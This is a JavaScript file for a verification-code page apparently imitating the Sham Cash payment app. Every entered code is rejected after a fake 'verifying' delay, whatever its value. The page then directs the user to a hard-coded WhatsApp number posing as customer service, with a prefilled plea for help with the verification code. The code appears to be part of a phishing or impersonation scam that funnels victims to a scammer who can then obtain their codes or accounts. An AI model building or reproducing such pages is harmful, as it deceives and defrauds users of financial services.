document.addEventListener('DOMContentLoaded', function() {
    const verificationForm = document.getElementById('verificationForm');
    const codeInputs = document.querySelectorAll('.code-input');
    const submitBtn = document.querySelector('.submit-btn');
    const errorMessage = document.getElementById('errorMessage');
    const whatsappBtn = document.getElementById('whatsappBtn');
    const backBtn = document.getElementById('backBtn');

    const WHATSAPP_NUMBER = '+963985601385';

    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            const value = e.target.value;
            
            if (!/^\d*$/.test(value)) {
                e.target.value = '';
                return;
            }

            if (value.length === 1) {
                e.target.classList.remove('error');
                if (index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
            }
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                codeInputs[index - 1].focus();
                codeInputs[index - 1].value = '';
            }

            if (e.key === 'ArrowLeft' && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }

            if (e.key === 'ArrowRight' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').trim();
            
            if (!/^\d{6}$/.test(pastedData)) {
                showNotification('الرجاء لصق رمز مكون من 6 أرقام فقط', 'error');
                return;
            }

            pastedData.split('').forEach((char, i) => {
                if (codeInputs[i]) {
                    codeInputs[i].value = char;
                }
            });

            codeInputs[codeInputs.length - 1].focus();
        });

        input.addEventListener('focus', function() {
            this.select();
        });
    });

    verificationForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const code = Array.from(codeInputs).map(input => input.value).join('');

        if (code.length !== 6) {
            showNotification('الرجاء إدخال الرمز كاملاً', 'error');
            return;
        }

        if (!/^\d{6}$/.test(code)) {
            showNotification('الرمز يجب أن يحتوي على أرقام فقط', 'error');
            return;
        }

        submitBtn.textContent = 'جاري التحقق...';
        submitBtn.disabled = true;

        setTimeout(() => {
            codeInputs.forEach(input => {
                input.classList.add('error');
                input.value = '';
            });

            errorMessage.classList.add('show');

            setTimeout(() => {
                whatsappBtn.classList.add('show');
            }, 500);

            submitBtn.textContent = 'التحقق';
            submitBtn.disabled = false;

            showNotification('رمز التحقق غير صحيح. تواصل مع خدمة العملاء', 'error');

            codeInputs[0].focus();
        }, 1500);
    });

    whatsappBtn.addEventListener('click', function() {
        const message = encodeURIComponent('مرحباً، أحتاج مساعدة في رمز التحقق لتطبيق شام كاش');
        const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER.replace(/\+/g, '')}?text=${message}`;
        window.open(whatsappUrl, '_blank');
    });

    backBtn.addEventListener('click', function() {
        document.querySelector('.verification-container').style.animation = 'fadeOut 0.4s ease-out';
        
        setTimeout(() => {
            window.location.href = 'login.html';
        }, 400);
    });

    function showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.textContent = message;
        
        const colors = {
            success: 'linear-gradient(135deg, #2ecc71, #27ae60)',
            error: 'linear-gradient(135deg, #e74c3c, #c0392b)',
            info: 'linear-gradient(135deg, #3498db, #2980b9)'
        };
        
        notification.style.cssText = `
            position: fixed;
            top: 30px;
            right: 30px;
            background: ${colors[type]};
            color: white;
            padding: 18px 28px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 10000;
            font-family: 'Cairo', sans-serif;
            font-size: 15px;
            font-weight: 600;
            animation: slideInRight 0.4s ease-out, slideOutRight 0.4s ease-in 2.6s;
            max-width: 320px;
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.remove();
        }, 3000);
    }

    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        @keyframes slideOutRight {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }

        @keyframes fadeOut {
            from {
                opacity: 1;
                transform: translateY(0);
            }
            to {
                opacity: 0;
                transform: translateY(-20px);
            }
        }
    `;
    document.head.appendChild(style);

    setTimeout(() => {
        codeInputs[0].focus();
    }, 600);
});
